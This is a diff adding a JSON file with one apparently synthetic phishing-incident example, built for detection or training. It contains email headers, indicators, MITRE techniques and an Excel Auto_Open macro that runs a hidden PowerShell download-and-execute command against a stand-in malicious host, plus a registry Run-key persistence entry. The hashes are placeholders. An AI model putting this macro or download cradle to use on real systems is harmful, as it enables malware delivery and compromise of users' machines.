@@ -1,0 +1,56 @@
+{
+  "examples": [
+    {
+      "scenario": "Spear-phishing email delivers weaponized Microsoft Excel attachment containing macro malware that executes on opening, leading to system compromise.",
+      "technical_data": {
+        "email_headers": "Return-Path: <alert@secure-payments.com>\r\nReceived: from mail.secure-payments.com (mail.secure-payments.com [198.51.100.23])\r\n\tby mx.company.com (Postfix) with ESMTPS id 1234ABCD56\r\n\tfor <victim@company.com>; Wed, 10 May 2023 14:22:43 +0000 (UTC)\r\nReceived-SPF: pass (company.com: domain of alert@secure-payments.com designates 198.51.100.23 as permitted sender) receiver=mx.company.com; client-ip=198.51.100.23; envelope-from=alert@secure-payments.com; helo=mail.secure-payments.com;\r\nAuthentication-Results: mx.company.com; dkim=pass header.d=secure-payments.com; spf=pass smtp.mailfrom=alert@secure-payments.com; dmarc=pass (p=none) header.from=secure-payments.com\r\nMessage-ID: <CAB34WEF234asfasdf@secure-payments.com>\r\nDate: Wed, 10 May 2023 14:22:42 +0000\r\nFrom: \"Secure Payments\" <alert@secure-payments.com>\r\nTo: victim@company.com\r\nSubject: Urgent: Invoice Payment Confirmation Required\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_123456_7890123.1683727362\"\r\nX-Mailer: Microsoft Outlook 16.0\r\nX-Spam-Status: No\r\nX-Company-MailScanner-SpamCheck: Not spam, score=-1.0\r\nX-Company-MailScanner-Info: Found to be clean",
+        "email_body": "------=_Part_123456_7890123.1683727362\r\nContent-Type: text/plain; charset=\"utf-8\"\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\nDear Finance Team,\r\n\r\nPlease review the attached invoice and confirm payment at your earliest convenience. This=0Ainvoice requires immediate attention to avoid service interruption.\r\n\r\nBest regards,\r\nSecure Payments Team\r\n------=_Part_123456_7890123.1683727362\r\nContent-Type: application/vnd.ms-excel; name=\"Invoice_May2023.xlsm\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Invoice_May2023.xlsm\"\r\n\r\nUEsDBBQABgAIAAAAIQDm9Nn5XQEAAH0FAAATAAgCW0NvbnRlbnRfVHlwZXNdLnhtbCCiBAIooAAC\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n... [truncated base64 of weaponized macro Excel] ...\r\n------=_Part_123456_7890123.1683727362--",
+        "smtp_transaction_log": "220 mail.secure-payments.com ESMTP Postfix\r\nEHLO mail.secure-payments.com\r\n250-mail.secure-payments.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-ETRN\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<alert@secure-payments.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<victim@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: \"Secure Payments\" <alert@secure-payments.com>\r\nTo: victim@company.com\r\nSubject: Urgent: Invoice Payment Confirmation Required\r\n...\r\n.\r\n250 2.0.0 Ok: queued as 1234ABCD56",
+        "attachment_hashes": {
+          "md5": "a1b2c3d4e5f67890123456789abcdef0",
+          "sha1": "d4c3b2a1e5f67890abcdef123456789012345678",
+          "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+        },
+        "macro_code_snippet": "Sub Auto_Open()\r\n    Dim strCmd As String\r\n    strCmd = \"powershell.exe -nop -w hidden -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://malicious-domain.com/payload.ps1')\\\"\"\r\n    Shell strCmd, vbHide\r\nEnd Sub",
+        "registry_artifacts": "HKCU\\Software\\Microsoft\\Office\\Excel\\Security\\AccessVBOM = 1 (enabled to allow macros)\r\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater = \"C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Updater\\updater.exe\"",
+        "process_chain": [
+          "explorer.exe -> excel.exe (Invoice_May2023.xlsm opened) -> powershell.exe -nop -w hidden -c IEX ... -> cmd.exe -> downloader payload"
+        ],
+        "network_traffic": "GET /payload.ps1 HTTP/1.1\r\nHost: malicious-domain.com\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
+        "dns_queries": [
+          "malicious-domain.com A 198.51.100.45"
+        ],
+        "domain_registration": {
+          "domain": "secure-payments.com",
+          "registrar": "NameCheap, Inc.",
+          "creation_date": "2023-04-15T10:21:00Z",
+          "expiration_date": "2024-04-15T10:21:00Z",
+          "name_servers": [
+            "ns1.namecheap.com",
+            "ns2.namecheap.com"
+          ],
+          "registrant_country": "RU"
+        }
+      },
+      "indicators": {
+        "suspicious_sender_domain": "secure-payments.com (recently registered, spoofing legitimate payment services)",
+        "attachment_type": "Excel macro-enabled workbook (.xlsm) with embedded Auto_Open macro",
+        "macro command": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(...)",
+        "network_ioc": "HTTP GET to http://malicious-domain.com/payload.ps1",
+        "file_hashes": {
+          "md5": "a1b2c3d4e5f67890123456789abcdef0"
+        },
+        "registry_persistence": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+        "process_behavior": "excel.exe spawning hidden powershell with encoded remote download command"
+      },
+      "detection_method": "Email gateway sandboxing flagged .xlsm attachment executing suspicious PowerShell commands; Endpoint detection flagged process creation chain involving Excel spawning PowerShell with network activity to suspicious domain; Network IDS detected HTTP GET to known malicious domain; User reported unexpected invoice email triggering incident response.",
+      "relevant_mitre_techniques": [
+        "T1193 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1105 - Ingress Tool Transfer",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+      ]
+    }
+  ]
+}
